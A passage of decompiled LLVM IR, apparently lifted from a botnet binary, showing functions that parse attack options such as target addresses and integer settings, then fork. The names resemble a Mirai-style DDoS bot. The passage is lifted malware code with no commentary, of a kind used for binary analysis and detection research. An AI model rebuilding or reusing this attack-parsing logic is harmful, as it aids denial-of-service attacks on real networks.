  uselistorder label %dec_label_pc_8548.dec_label_pc_8548_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_852c, { 3, 0, 2, 1, 4 }
  uselistorder label %dec_label_pc_852c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_84c0, { 1, 0 }
  uselistorder label %dec_label_pc_8444, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb174, { 1, 0 }
  uselistorder label %bb172, { 1, 0 }
  uselistorder label %dec_label_pc_82fc, { 1, 0 }
  uselistorder label %dec_label_pc_82b4, { 1, 3, 4, 0, 2 }
}

define i32 @attack_get_opt_str(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_9f60 = icmp eq i32 %arg1, 0
  br i1 %v2_9f60, label %dec_label_pc_9fa8, label %dec_label_pc_9f70

dec_label_pc_9f70:                                ; preds = %entry
  %v0_9f70 = load i32, i32* %r1.global-to-local, align 4
  %v1_9f70 = add i32 %v0_9f70, 4
  %v2_9f70 = inttoptr i32 %v1_9f70 to i8*
  %v3_9f70 = load i8, i8* %v2_9f70, align 1
  %v4_9f70 = zext i8 %v3_9f70 to i32
  %v9_9f74 = icmp eq i32 %v4_9f70, %arg3
  br i1 %v9_9f74, label %dec_label_pc_9fb4, label %dec_label_pc_9f98.preheader

dec_label_pc_9f98.preheader:                      ; preds = %dec_label_pc_9f70
  br label %dec_label_pc_9f98

dec_label_pc_9f88:                                ; preds = %dec_label_pc_9f98
  %v1_9f88 = add i32 %v0_9f90.in, 12
  %v2_9f88 = inttoptr i32 %v1_9f88 to i8*
  %v3_9f88 = load i8, i8* %v2_9f88, align 1
  %v4_9f88 = zext i8 %v3_9f88 to i32
  %v9_9f8c = icmp eq i32 %v4_9f88, %arg3
  br i1 %v9_9f8c, label %dec_label_pc_9fb4, label %dec_label_pc_9f98

dec_label_pc_9f98:                                ; preds = %dec_label_pc_9f98.preheader, %dec_label_pc_9f88
  %v0_9f90.in = phi i32 [ %v0_9f70, %dec_label_pc_9f98.preheader ], [ %v0_9f90, %dec_label_pc_9f88 ]
  %v0_9f98 = phi i32 [ 0, %dec_label_pc_9f98.preheader ], [ %v1_9f98, %dec_label_pc_9f88 ]
  %v0_9f90 = add i32 %v0_9f90.in, 8
  %v1_9f98 = add i32 %v0_9f98, 1
  %v9_9f9c = icmp eq i32 %v1_9f98, %arg1
  store i32 %v0_9f90, i32* %r1.global-to-local, align 4
  br i1 %v9_9f9c, label %dec_label_pc_9fa8, label %dec_label_pc_9f88

dec_label_pc_9fa8:                                ; preds = %dec_label_pc_9f98, %entry, %dec_label_pc_9fb4
  %v0_9fa8 = phi i32 [ %arg4, %entry ], [ %v2_9fb4, %dec_label_pc_9fb4 ], [ %arg4, %dec_label_pc_9f98 ]
  ret i32 %v0_9fa8

dec_label_pc_9fb4:                                ; preds = %dec_label_pc_9f88, %dec_label_pc_9f70
  %v0_9fb4 = phi i32 [ %v0_9f70, %dec_label_pc_9f70 ], [ %v0_9f90, %dec_label_pc_9f88 ]
  %v1_9fb4 = inttoptr i32 %v0_9fb4 to i32*
  %v2_9fb4 = load i32, i32* %v1_9fb4, align 4
  br label %dec_label_pc_9fa8

; uselistorder directives
  uselistorder i32 %v1_9f98, { 1, 0 }
  uselistorder i32 %v0_9f90, { 1, 0, 2 }
  uselistorder i32 %v0_9f90.in, { 1, 0 }
  uselistorder i32 %v0_9f70, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9fa8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9f98, { 1, 0 }
}

define i32 @attack_get_opt_ip(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_9fbc = icmp eq i32 %arg1, 0
  %v3_9fc0 = load i32, i32* @r4, align 4
  store i32 %v3_9fc0, i32* %stack_var_-8, align 4
  %v6_9fc0 = load i32, i32* @lr, align 4
  store i32 %arg4, i32* @r4, align 4
  br i1 %v2_9fbc, label %dec_label_pc_a004, label %dec_label_pc_9fcc

dec_label_pc_9fcc:                                ; preds = %entry
  %v0_9fcc = load i32, i32* %r1.global-to-local, align 4
  %v1_9fcc = add i32 %v0_9fcc, 4
  %v2_9fcc = inttoptr i32 %v1_9fcc to i8*
  %v3_9fcc = load i8, i8* %v2_9fcc, align 1
  %v4_9fcc = zext i8 %v3_9fcc to i32
  %v9_9fd0 = icmp eq i32 %v4_9fcc, %arg3
  br i1 %v9_9fd0, label %dec_label_pc_a010, label %dec_label_pc_9ff4.preheader

dec_label_pc_9ff4.preheader:                      ; preds = %dec_label_pc_9fcc
  br label %dec_label_pc_9ff4

dec_label_pc_9fe4:                                ; preds = %dec_label_pc_9ff4
  %v1_9fe4 = add i32 %v0_9fec.in, 12
  %v2_9fe4 = inttoptr i32 %v1_9fe4 to i8*
  %v3_9fe4 = load i8, i8* %v2_9fe4, align 1
  %v4_9fe4 = zext i8 %v3_9fe4 to i32
  %v9_9fe8 = icmp eq i32 %v4_9fe4, %arg3
  br i1 %v9_9fe8, label %dec_label_pc_a010, label %dec_label_pc_9ff4

dec_label_pc_9ff4:                                ; preds = %dec_label_pc_9ff4.preheader, %dec_label_pc_9fe4
  %v0_9fec.in = phi i32 [ %v0_9fcc, %dec_label_pc_9ff4.preheader ], [ %v0_9fec, %dec_label_pc_9fe4 ]
  %v0_9ff4 = phi i32 [ 0, %dec_label_pc_9ff4.preheader ], [ %v1_9ff4, %dec_label_pc_9fe4 ]
  %v0_9fec = add i32 %v0_9fec.in, 8
  %v1_9ff4 = add i32 %v0_9ff4, 1
  %v9_9ff8 = icmp eq i32 %v1_9ff4, %arg1
  store i32 %v0_9fec, i32* %r1.global-to-local, align 4
  br i1 %v9_9ff8, label %dec_label_pc_a004, label %dec_label_pc_9fe4

dec_label_pc_a004:                                ; preds = %dec_label_pc_9ff4, %dec_label_pc_a010, %entry, %dec_label_pc_a01c
  %v2_a008 = phi i32 [ %v3_9fc0, %dec_label_pc_a010 ], [ %v3_9fc0, %entry ], [ %v2_a008.pre, %dec_label_pc_a01c ], [ %v3_9fc0, %dec_label_pc_9ff4 ]
  %v0_a004 = phi i32 [ %arg4, %dec_label_pc_a010 ], [ %arg4, %entry ], [ %v1_a01c, %dec_label_pc_a01c ], [ %arg4, %dec_label_pc_9ff4 ]
  store i32 %v2_a008, i32* @r4, align 4
  store i32 %v6_9fc0, i32* @lr, align 4
  ret i32 %v0_a004

dec_label_pc_a010:                                ; preds = %dec_label_pc_9fe4, %dec_label_pc_9fcc
  %v0_a010 = phi i32 [ %v0_9fcc, %dec_label_pc_9fcc ], [ %v0_9fec, %dec_label_pc_9fe4 ]
  %v1_a010 = inttoptr i32 %v0_a010 to i32*
  %v2_a010 = load i32, i32* %v1_a010, align 4
  store i32 %v2_a010, i32* @r0, align 4
  %v2_a014 = icmp eq i32 %v2_a010, 0
  br i1 %v2_a014, label %dec_label_pc_a004, label %dec_label_pc_a01c

dec_label_pc_a01c:                                ; preds = %dec_label_pc_a010
  %v1_a01c = call i32 @inet_addr(i32 %v2_a010)
  %v2_a008.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_a004

; uselistorder directives
  uselistorder i32 %v1_9ff4, { 1, 0 }
  uselistorder i32 %v0_9fec, { 1, 0, 2 }
  uselistorder i32 %v0_9fec.in, { 1, 0 }
  uselistorder i32 %v0_9fcc, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a004, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_9ff4, { 1, 0 }
}

define i32 @attack_get_opt_int(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_a028 = icmp eq i32 %arg1, 0
  %v3_a02c = load i32, i32* @r4, align 4
  store i32 %v3_a02c, i32* %stack_var_-8, align 4
  %v6_a02c = load i32, i32* @lr, align 4
  br i1 %v2_a028, label %dec_label_pc_a070, label %dec_label_pc_a038

dec_label_pc_a038:                                ; preds = %entry
  %v0_a038 = load i32, i32* %r1.global-to-local, align 4
  %v1_a038 = add i32 %v0_a038, 4
  %v2_a038 = inttoptr i32 %v1_a038 to i8*
  %v3_a038 = load i8, i8* %v2_a038, align 1
  %v4_a038 = zext i8 %v3_a038 to i32
  %v9_a03c = icmp eq i32 %v4_a038, %arg3
  br i1 %v9_a03c, label %dec_label_pc_a07c, label %dec_label_pc_a060.preheader

dec_label_pc_a060.preheader:                      ; preds = %dec_label_pc_a038
  br label %dec_label_pc_a060

dec_label_pc_a050:                                ; preds = %dec_label_pc_a060
  %v1_a050 = add i32 %v0_a058.in, 12
  %v2_a050 = inttoptr i32 %v1_a050 to i8*
  %v3_a050 = load i8, i8* %v2_a050, align 1
  %v4_a050 = zext i8 %v3_a050 to i32
  %v9_a054 = icmp eq i32 %v4_a050, %arg3
  br i1 %v9_a054, label %dec_label_pc_a07c, label %dec_label_pc_a060

dec_label_pc_a060:                                ; preds = %dec_label_pc_a060.preheader, %dec_label_pc_a050
  %v0_a058.in = phi i32 [ %v0_a038, %dec_label_pc_a060.preheader ], [ %v0_a058, %dec_label_pc_a050 ]
  %v0_a060 = phi i32 [ 0, %dec_label_pc_a060.preheader ], [ %v1_a060, %dec_label_pc_a050 ]
  %v0_a058 = add i32 %v0_a058.in, 8
  %v1_a060 = add i32 %v0_a060, 1
  %v9_a064 = icmp eq i32 %v1_a060, %arg1
  store i32 %v0_a058, i32* %r1.global-to-local, align 4
  br i1 %v9_a064, label %dec_label_pc_a070, label %dec_label_pc_a050

dec_label_pc_a070:                                ; preds = %dec_label_pc_a060, %dec_label_pc_a07c, %entry, %dec_label_pc_a088
  %v2_a074 = phi i32 [ %v3_a02c, %dec_label_pc_a07c ], [ %v3_a02c, %entry ], [ %v2_a074.pre, %dec_label_pc_a088 ], [ %v3_a02c, %dec_label_pc_a060 ]
  %v0_a070 = phi i32 [ %arg4, %dec_label_pc_a07c ], [ %arg4, %entry ], [ %v3_a08c, %dec_label_pc_a088 ], [ %arg4, %dec_label_pc_a060 ]
  store i32 %v2_a074, i32* @r4, align 4
  store i32 %v6_a02c, i32* @lr, align 4
  ret i32 %v0_a070

dec_label_pc_a07c:                                ; preds = %dec_label_pc_a050, %dec_label_pc_a038
  %v0_a07c = phi i32 [ %v0_a038, %dec_label_pc_a038 ], [ %v0_a058, %dec_label_pc_a050 ]
  %v1_a07c = inttoptr i32 %v0_a07c to i32*
  %v2_a07c = load i32, i32* %v1_a07c, align 4
  %v2_a080 = icmp eq i32 %v2_a07c, 0
  br i1 %v2_a080, label %dec_label_pc_a070, label %dec_label_pc_a088

dec_label_pc_a088:                                ; preds = %dec_label_pc_a07c
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_a08c = inttoptr i32 %v2_a07c to i8*
  %v3_a08c = call i32 @util_atoi(i8* %v2_a08c, i32 10)
  %v2_a074.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_a070

; uselistorder directives
  uselistorder i32 %v1_a060, { 1, 0 }
  uselistorder i32 %v0_a058, { 1, 0, 2 }
  uselistorder i32 %v0_a058.in, { 1, 0 }
  uselistorder i32 %v0_a038, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_a070, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_a060, { 1, 0 }
}

define i32 @attack_parse(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_a098 = load i32, i32* @r5, align 4
  %v9_a098 = load i32, i32* @r6, align 4
  %v12_a098 = load i32, i32* @r7, align 4
  %v18_a098 = load i32, i32* @sb, align 4
  %v21_a098 = load i32, i32* @sl, align 4
  %v24_a098 = load i32, i32* @fp, align 4
  %v2_a09c = icmp ugt i32 %arg2, 2
  %v7_a09c = icmp eq i32 %arg2, 3
  store i1 %v7_a09c, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r4, align 4
  %v0_a0a8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_a0a8, i32* @r5, align 4
  %v2_a0ac = xor i1 %v7_a09c, true
  %v3_a0ac = and i1 %v2_a09c, %v2_a0ac
  br i1 %v3_a0ac, label %dec_label_pc_a0bc, label %dec_label_pc_a0b0

dec_label_pc_a0b0:                                ; preds = %dec_label_pc_a100, %.dec_label_pc_a0b0_crit_edge, %dec_label_pc_a0f4, %dec_label_pc_a0e4, %dec_label_pc_a0bc, %entry, %dec_label_pc_a2a8
  %v1_a0b8 = phi i32 [ %v1_a0b8.pre, %.dec_label_pc_a0b0_crit_edge ], [ %v1_a0c0, %dec_label_pc_a100 ], [ %v1_a0c0, %dec_label_pc_a0f4 ], [ %v1_a0c0, %dec_label_pc_a0e4 ], [ %v1_a0c0, %dec_label_pc_a0bc ], [ %v0_a0a8, %entry ], [ %v0_a2ac, %dec_label_pc_a2a8 ]
  store i32 %v6_a098, i32* @r5, align 4
  store i32 %v9_a098, i32* @r6, align 4
  store i32 %v12_a098, i32* @r7, align 4
  store i32 %v18_a098, i32* @sb, align 4
  store i32 %v21_a098, i32* @sl, align 4
  store i32 %v24_a098, i32* @fp, align 4
  ret i32 %v1_a0b8

dec_label_pc_a0bc:                                ; preds = %entry
  %v1_a0bc = inttoptr i32 %v0_a0a8 to i32*
  %v2_a0bc = load i32, i32* %v1_a0bc, align 4
  %v1_a0c0 = and i32 %v2_a0bc, 16711680
  store i32 %v1_a0c0, i32* %r0.global-to-local, align 4
  %v3_a0c4 = udiv i32 %v2_a0bc, 16777216
  %v1_a0c8 = and i32 %v2_a0bc, 65280
  %v4_a0cc = udiv i32 %v1_a0c0, 256
  %v5_a0cc = or i32 %v4_a0cc, %v3_a0c4
  %v4_a0d0 = mul nuw nsw i32 %v1_a0c8, 256
  %v5_a0d0 = or i32 %v5_a0cc, %v4_a0d0
  store i32 %v5_a0d0, i32* %r3.global-to-local, align 4
  %v5_a0d4 = call i32 @llvm.bswap.i32(i32 %v2_a0bc)
  store i32 %v5_a0d4, i32* %r1.global-to-local, align 4
  %v7_a0d8 = icmp eq i32 %arg2, 4
  store i1 %v7_a0d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a0d8, label %dec_label_pc_a0b0, label %dec_label_pc_a0e4

dec_label_pc_a0e4:                                ; preds = %dec_label_pc_a0bc
  %v1_a0e4 = add i32 %v0_a0a8, 4
  %v2_a0e4 = inttoptr i32 %v1_a0e4 to i8*
  %v3_a0e4 = load i8, i8* %v2_a0e4, align 1
  %v4_a0e4 = zext i8 %v3_a0e4 to i32
  store i32 %v4_a0e4, i32* %r3.global-to-local, align 4
  %v7_a0e8 = icmp eq i32 %arg2, 5
  store i1 %v7_a0e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a0e8, label %dec_label_pc_a0b0, label %dec_label_pc_a0f4

dec_label_pc_a0f4:                                ; preds = %dec_label_pc_a0e4
  %v1_a0f4 = add i32 %v0_a0a8, 5
  %v2_a0f4 = inttoptr i32 %v1_a0f4 to i8*
  %v3_a0f4 = load i8, i8* %v2_a0f4, align 1
  %v4_a0f4 = zext i8 %v3_a0f4 to i32
  store i32 %v4_a0f4, i32* @sb, align 4
  %v2_a0f8 = icmp eq i8 %v3_a0f4, 0
  store i1 %v2_a0f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a0f8, label %dec_label_pc_a0b0, label %dec_label_pc_a100

dec_label_pc_a100:                                ; preds = %dec_label_pc_a0f4
  %v2_a104 = mul nuw nsw i32 %v4_a0f4, 5
  store i32 %v2_a104, i32* @r7, align 4
  %v1_a108 = add i32 %arg2, -6
  store i32 %v1_a108, i32* %r3.global-to-local, align 4
  %v3_a10c = icmp ult i32 %v1_a108, %v2_a104
  %v9_a10c = icmp eq i32 %v1_a108, %v2_a104
  store i1 %v9_a10c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_a10c, label %dec_label_pc_a0b0, label %dec_label_pc_a114

dec_label_pc_a114:                                ; preds = %dec_label_pc_a100
  store i32 %v4_a0f4, i32* %r0.global-to-local, align 4
  store i32 24, i32* %r1.global-to-local, align 4
  store i32 %v1_a108, i32* @r6, align 4
  %v2_a120 = call i32 @calloc(i32 %v4_a0f4, i32 24)
  store i32 %v2_a120, i32* %ip.global-to-local, align 4
  %v0_a12c = load i32, i32* @r7, align 4
  %v1_a12c = load i32, i32* @r4, align 4
  %v2_a12c = sub i32 %v1_a12c, %v0_a12c
  store i32 %v2_a12c, i32* @r7, align 4
  %v0_a130 = load i32, i32* @r5, align 4
  %v1_a130 = add i32 %v0_a130, 11
  store i32 %v1_a130, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a134

dec_label_pc_a134:                                ; preds = %dec_label_pc_a134, %dec_label_pc_a114
  %v1_a138 = phi i32 [ %v1_a164, %dec_label_pc_a134 ], [ %v2_a120, %dec_label_pc_a114 ]
  %v0_a134 = phi i32 [ %v1_a160, %dec_label_pc_a134 ], [ %v1_a130, %dec_label_pc_a114 ]
  %v1_a134 = add i32 %v0_a134, -5
  %v2_a134 = inttoptr i32 %v1_a134 to i32*
  %v3_a134 = load i32, i32* %v2_a134, align 4
  store i32 %v3_a134, i32* %r1.global-to-local, align 4
  %v2_a138 = add i32 %v1_a138, 16
  %v3_a138 = inttoptr i32 %v2_a138 to i32*
  store i32 %v3_a134, i32* %v3_a138, align 4
  %v0_a13c = load i32, i32* @r6, align 4
  %v1_a13c = add i32 %v0_a13c, -5
  store i32 %v1_a13c, i32* @r6, align 4
  %v0_a140 = load i32, i32* %r0.global-to-local, align 4
  %v1_a140 = add i32 %v0_a140, -1
  %v2_a140 = inttoptr i32 %v1_a140 to i8*
  %v3_a140 = load i8, i8* %v2_a140, align 1
  %v0_a144 = load i32, i32* @r7, align 4
  %v1_a144 = add i32 %v0_a144, -6
  store i32 %v1_a144, i32* %r3.global-to-local, align 4
  store i32 2, i32* @lr, align 4
  %v9_a14c = icmp eq i32 %v1_a13c, %v1_a144
  store i1 %v9_a14c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_a140, i32* @r4, align 4
  %v2_a154 = load i32, i32* %ip.global-to-local, align 4
  %v3_a154 = add i32 %v2_a154, 20
  %v4_a154 = inttoptr i32 %v3_a154 to i8*
  store i8 %v3_a140, i8* %v4_a154, align 1
  %v0_a158 = load i32, i32* %r1.global-to-local, align 4
  %v1_a158 = load i32, i32* %ip.global-to-local, align 4
  %v2_a158 = add i32 %v1_a158, 4
  %v3_a158 = inttoptr i32 %v2_a158 to i32*
  store i32 %v0_a158, i32* %v3_a158, align 4
  %v0_a15c = load i32, i32* @lr, align 4
  %v1_a15c = trunc i32 %v0_a15c to i16
  %v2_a15c = load i32, i32* %ip.global-to-local, align 4
  %v3_a15c = inttoptr i32 %v2_a15c to i16*
  store i16 %v1_a15c, i16* %v3_a15c, align 2
  %v0_a160 = load i32, i32* %r0.global-to-local, align 4
  %v1_a160 = add i32 %v0_a160, 5
  store i32 %v1_a160, i32* %r0.global-to-local, align 4
  %v0_a164 = load i32, i32* %ip.global-to-local, align 4
  %v1_a164 = add i32 %v0_a164, 24
  store i32 %v1_a164, i32* %ip.global-to-local, align 4
  %v0_a168 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a168, label %dec_label_pc_a16c, label %dec_label_pc_a134

dec_label_pc_a16c:                                ; preds = %dec_label_pc_a134
  %v0_a16c = load i32, i32* @r6, align 4
  %v2_a16c = icmp eq i32 %v0_a16c, 0
  store i1 %v2_a16c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a16c, label %dec_label_pc_a26c, label %dec_label_pc_a174

dec_label_pc_a174:                                ; preds = %dec_label_pc_a16c
  %v0_a174 = load i32, i32* @r4, align 4
  %v1_a174 = inttoptr i32 %v0_a174 to i8*
  %v2_a174 = load i8, i8* %v1_a174, align 1
  %v3_a174 = zext i8 %v2_a174 to i32
  store i32 %v3_a174, i32* @r5, align 4
  %v2_a178 = icmp eq i8 %v2_a174, 0
  store i1 %v2_a178, i1* %cpsr_z.global-to-local, align 1
  %v0_a17c = load i32, i32* @r7, align 4
  %v1_a17c = add i32 %v0_a17c, -7
  store i32 %v1_a17c, i32* @r8, align 4
  br i1 %v2_a178, label %bb, label %dec_label_pc_a188

bb:                                               ; preds = %dec_label_pc_a174
  store i32 %v3_a174, i32* @r6, align 4
  br label %dec_label_pc_a23c

dec_label_pc_a188:                                ; preds = %dec_label_pc_a174
  store i32 %v3_a174, i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_a190 = call i32 @calloc(i32 %v3_a174, i32 8)
  store i32 %v2_a190, i32* %r0.global-to-local, align 4
  %v0_a194 = load i32, i32* @r8, align 4
  %v2_a194 = icmp eq i32 %v0_a194, 0
  store i1 %v2_a194, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_a190, i32* @r6, align 4
  br i1 %v2_a194, label %dec_label_pc_a26c, label %dec_label_pc_a1a0

dec_label_pc_a1a0:                                ; preds = %dec_label_pc_a188
  %v0_a1a0 = load i32, i32* @r4, align 4
  %v1_a1a0 = add i32 %v0_a1a0, 1
  %v2_a1a0 = inttoptr i32 %v1_a1a0 to i8*
  %v3_a1a0 = load i8, i8* %v2_a1a0, align 1
  %v0_a1a4 = load i32, i32* @r7, align 4
  %v7_a1a4 = icmp eq i32 %v0_a1a4, 8
  store i1 %v7_a1a4, i1* %cpsr_z.global-to-local, align 1
  %v3_a1a8 = add i32 %v2_a190, 4
  %v4_a1a8 = inttoptr i32 %v3_a1a8 to i8*
  store i8 %v3_a1a0, i8* %v4_a1a8, align 1
  %v0_a1ac = load i32, i32* @r4, align 4
  %v1_a1ac = add i32 %v0_a1ac, 1
  store i32 %v1_a1ac, i32* %r3.global-to-local, align 4
  %v0_a1b0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a1b0, label %dec_label_pc_a26c, label %dec_label_pc_a1b4

dec_label_pc_a1b4:                                ; preds = %dec_label_pc_a1a0
  %v1_a1b4 = add i32 %v0_a1ac, 2
  %v2_a1b4 = inttoptr i32 %v1_a1b4 to i8*
  %v3_a1b4 = load i8, i8* %v2_a1b4, align 1
  %v4_a1b4 = zext i8 %v3_a1b4 to i32
  store i32 %v4_a1b4, i32* @r4, align 4
  %v0_a1b8 = load i32, i32* @r7, align 4
  %v1_a1b8 = add i32 %v0_a1b8, -9
  store i32 %v1_a1b8, i32* @r7, align 4
  %v9_a1bc = icmp eq i32 %v1_a1b8, %v4_a1b4
  store i1 %v9_a1bc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a1b4, i32* %r1.global-to-local, align 4
  %v5_a1c4 = icmp slt i32 %v1_a1b8, %v4_a1b4
  br i1 %v5_a1c4, label %dec_label_pc_a26c, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_a1b4
  %v7_a1c44711 = add i32 %v0_a1ac, 3
  store i32 %v7_a1c44711, i32* @r8, align 4
  %v6_a1c8812 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v6_a1c8812, i32* @sl, align 4
  store i32 0, i32* @fp, align 4
  br label %dec_label_pc_a214

dec_label_pc_a1d8:                                ; preds = %dec_label_pc_a214
  %v0_a1d8 = load i32, i32* @r7, align 4
  %v1_a1d8 = load i32, i32* @r4, align 4
  %v2_a1d8 = sub i32 %v0_a1d8, %v1_a1d8
  store i32 %v2_a1d8, i32* %r1.global-to-local, align 4
  %v9_a1d8 = icmp eq i32 %v0_a1d8, %v1_a1d8
  store i1 %v9_a1d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a1d8, label %dec_label_pc_a26c, label %dec_label_pc_a1e0

dec_label_pc_a1e0:                                ; preds = %dec_label_pc_a1d8
  %v3_a1e0 = mul i32 %v0_a234, 8
  store i32 %v3_a1e0, i32* %r3.global-to-local, align 4
  %v1_a1e4 = load i32, i32* @r8, align 4
  %v2_a1e4 = add i32 %v1_a1e4, %v1_a1d8
  %v3_a1e4 = inttoptr i32 %v2_a1e4 to i8*
  %v4_a1e4 = load i8, i8* %v3_a1e4, align 1
  %v0_a1e8 = load i32, i32* @r6, align 4
  %v2_a1e8 = add i32 %v0_a1e8, %v3_a1e0
  store i32 %v2_a1e8, i32* @sl, align 4
  %v1_a1ec = add i32 %v2_a1d8, -1
  store i32 %v1_a1ec, i32* %r3.global-to-local, align 4
  %v7_a1ec = icmp eq i32 %v2_a1d8, 1
  store i1 %v7_a1ec, i1* %cpsr_z.global-to-local, align 1
  %v3_a1f0 = add i32 %v2_a1e8, 4
  %v4_a1f0 = inttoptr i32 %v3_a1f0 to i8*
  store i8 %v4_a1e4, i8* %v4_a1f0, align 1
  %v0_a1f4 = load i32, i32* @r4, align 4
  %v1_a1f4 = load i32, i32* @r8, align 4
  %v2_a1f4 = add i32 %v1_a1f4, %v0_a1f4
  store i32 %v2_a1f4, i32* %r1.global-to-local, align 4
  %v0_a1f8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a1f8, label %dec_label_pc_a26c, label %dec_label_pc_a1fc

dec_label_pc_a1fc:                                ; preds = %dec_label_pc_a1e0
  %v1_a1fc = add i32 %v2_a1f4, 1
  %v2_a1fc = inttoptr i32 %v1_a1fc to i8*
  %v3_a1fc = load i8, i8* %v2_a1fc, align 1
  %v4_a1fc = zext i8 %v3_a1fc to i32
  store i32 %v4_a1fc, i32* @r4, align 4
  %v0_a200 = load i32, i32* %r3.global-to-local, align 4
  %v1_a200 = add i32 %v0_a200, -1
  store i32 %v1_a200, i32* @r7, align 4
  %v2_a204 = sub i32 %v1_a200, %v4_a1fc
  %tmp46 = sub i32 0, %v2_a204
  %v6_a204 = and i32 %v1_a200, %tmp46
  %v7_a204 = icmp slt i32 %v6_a204, 0
  %v8_a204 = icmp slt i32 %v2_a204, 0
  %v9_a204 = icmp eq i32 %v1_a200, %v4_a1fc
  store i1 %v9_a204, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a1fc, i32* %r1.global-to-local, align 4
  %v2_a20c = xor i1 %v8_a204, %v7_a204
  br i1 %v2_a20c, label %dec_label_pc_a26c, label %dec_label_pc_a210

dec_label_pc_a210:                                ; preds = %dec_label_pc_a1fc
  %v1_a210 = add i32 %v2_a1f4, 2
  store i32 %v1_a210, i32* @r8, align 4
  br label %dec_label_pc_a214

dec_label_pc_a214:                                ; preds = %.thread10, %dec_label_pc_a210
  %v0_a218 = phi i32 [ %v4_a1b4, %.thread10 ], [ %v4_a1fc, %dec_label_pc_a210 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_a218 = add nuw nsw i32 %v0_a218, 1
  store i32 %v2_a218, i32* %r0.global-to-local, align 4
  %v2_a21c = call i32 @calloc(i32 %v2_a218, i32 1)
  store i32 %v2_a21c, i32* %r0.global-to-local, align 4
  %v0_a220 = load i32, i32* @fp, align 4
  %v1_a220 = add i32 %v0_a220, 1
  store i32 %v1_a220, i32* @fp, align 4
  %v1_a224 = load i32, i32* @sl, align 4
  %v2_a224 = inttoptr i32 %v1_a224 to i32*
  store i32 %v2_a21c, i32* %v2_a224, align 4
  %v0_a228 = load i32, i32* @r8, align 4
  store i32 %v0_a228, i32* %r1.global-to-local, align 4
  %v0_a22c = load i32, i32* @r4, align 4
  %v3_a230 = call i32 @util_memcpy(i32 %v2_a21c, i32 %v0_a228, i32 %v0_a22c)
  store i32 %v3_a230, i32* %r0.global-to-local, align 4
  %v0_a234 = load i32, i32* @fp, align 4
  %v1_a234 = load i32, i32* @r5, align 4
  %v9_a234 = icmp eq i32 %v0_a234, %v1_a234
  store i1 %v9_a234, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a234, label %dec_label_pc_a23c, label %dec_label_pc_a1d8

dec_label_pc_a23c:                                ; preds = %dec_label_pc_a214, %bb
  %v0_a23c = call i32 @__GI___errno_location()
  store i32 %v0_a23c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a244 = inttoptr i32 %v0_a23c to i32*
  store i32 0, i32* %v2_a244, align 4
  %v0_a248 = call i32 @__libc_fork()
  store i32 %v0_a248, i32* %r0.global-to-local, align 4
  %v7_a24c = icmp eq i32 %v0_a248, -1
  %. = zext i1 %v7_a24c to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v2_a258 = icmp eq i32 %v0_a248, 0
  store i1 %v2_a258, i1* %cpsr_z.global-to-local, align 1
  %tmp49 = icmp slt i32 %v0_a248, 1
  br i1 %tmp49, label %bb50, label %.thread14

.thread14:                                        ; preds = %dec_label_pc_a23c
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_a26c

